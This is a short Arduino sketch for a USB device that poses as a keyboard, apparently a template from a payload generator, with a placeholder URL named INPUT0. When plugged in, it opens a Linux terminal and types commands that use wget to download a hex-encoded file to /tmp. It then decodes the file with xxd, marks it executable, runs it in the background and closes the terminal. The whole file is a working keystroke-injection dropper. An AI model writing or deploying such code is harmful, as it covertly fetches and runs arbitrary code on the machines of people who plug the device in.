void setup(){
  Keyboard.begin();
}

void loop()
{
  delay(5000);
  terminal();
  delay(3000);
  Keyboard.println(F("wget -O /tmp/pay INPUT0"));
  delay(2000);
  Keyboard.println(F("xxd -r -p /tmp/pay /tmp/payload"));
  delay(2000);
  Keyboard.println(F("chmod +x /tmp/payload"));
  Keyboard.println(F("/tmp/payload &"));
  delay(2000);
  Keyboard.println(F("exit"));
  while(true); 
}

void terminal()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll(); 
}

